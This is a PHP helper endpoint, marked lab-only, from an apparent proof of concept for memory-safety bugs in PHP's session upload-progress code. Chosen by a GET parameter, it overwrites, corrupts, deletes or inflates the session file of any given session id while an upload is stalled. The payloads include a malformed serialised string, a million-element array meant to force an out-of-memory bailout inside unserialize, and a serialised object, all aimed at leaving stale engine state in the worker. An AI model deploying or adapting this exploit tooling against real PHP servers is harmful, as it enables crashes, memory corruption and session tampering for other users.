<?php
/**
 * LAB ONLY — helper endpoint for the PoC.
 *
 * Modifies the session file of the current session (same PHPSESSID) while a
 * multipart upload is stalled halfway through the stream, forcing the next
 * call to php_session_initialize() — invoked by every
 * php_session_rfc1867_update() — to re-read and rebuild $_SESSION through
 * php_session_track_init() (ext/session/session.c:236-252 and :467).
 *
 * NEVER expose this outside the lab container.
 */

$sid  = preg_replace('/[^a-zA-Z0-9,-]/', '', (string)($_GET['sid'] ?? ''));
$mode = (string)($_GET['mode'] ?? 'corrupt');

header('Content-Type: text/plain; charset=utf-8');

if ($sid === '') {
    http_response_code(400);
    exit("bad sid\n");
}

$path = rtrim((string)ini_get('session.save_path'), '/') . '/sess_' . $sid;

switch ($mode) {
    case 'corrupt':
        // Invalid deserialization payload. php_session_decode() returns
        // FAILURE -> php_session_cancel_decode() -> php_session_destroy() +
        // php_session_track_init(): the $_SESSION tree is destroyed and a new
        // one is created in the middle of the upload.
        $ok = @file_put_contents($path, 'upload_progress_cve2026|s:99999:"x');
        echo 'corrupt=' . ($ok !== false ? '1' : '0') . "\n";
        break;

    case 'delete':
        // s_read of the save handler over a non-existent file.
        echo 'delete=' . (@unlink($path) ? '1' : '0') . "\n";
        break;

    case 'small':
        // Valid and small session (the consumer decodes it without trouble).
        $ok = @file_put_contents($path, 'upload_progress_x|i:1;');
        echo 'small=' . ($ok !== false ? '1' : '0') . "\n";
        break;

    case 'huge':
        // Huge session: N elements. Decoding it during startup (upload
        // progress) makes array_init_size(N) exceed memory_limit -> OOM inside
        // unserialize -> zend_bailout() skips PHP_VAR_UNSERIALIZE_DESTROY ->
        // the BG(unserialize) global keeps pointing at the request heap that
        // is about to be freed (CVE-2026-109619).
        $n = max(1, (int)($_GET['n'] ?? 1048576));
        $path_tmp = $path . '.building';
        $fh = fopen($path_tmp, 'wb');
        fwrite($fh, 'upload_progress_x|a:' . $n . ':{');
        $chunk = '';
        for ($i = 0; $i < $n; $i++) {
            $chunk .= 'i:' . $i . ';i:' . $i . ';';
            if (strlen($chunk) > 1048576) { fwrite($fh, $chunk); $chunk = ''; }
        }
        fwrite($fh, $chunk . '}');
        fclose($fh);
        rename($path_tmp, $path);
        echo 'huge=' . $n . ' bytes=' . filesize($path) . "\n";
        break;

    case 'object':
        // Session holding a serialised object. Decoding it during startup
        // (before RINIT) publishes object state (the object store) that
        // belongs to the request. A later OOM prevents the reset -> that state
        // survives in the worker.
        // Format of the "php" serialiser: key|object;
        $payload = 'upload_progress_x|O:8:"stdClass":1:{s:3:"foo";s:1:"a";}';
        $ok = @file_put_contents($path, $payload);
        echo 'object=' . ($ok !== false ? '1' : '0') . "\n";
        break;

    case 'destroy':
        // "Normal" request: session_start() takes the flock of the session
        // file that the upload request holds (it may block until the upload
        // finishes; that is useful information too).
        session_id($sid);
        session_start();
        $_SESSION = [];
        session_destroy();
        echo "destroy=1\n";
        break;

    default:
        http_response_code(400);
        exit("bad mode\n");
}
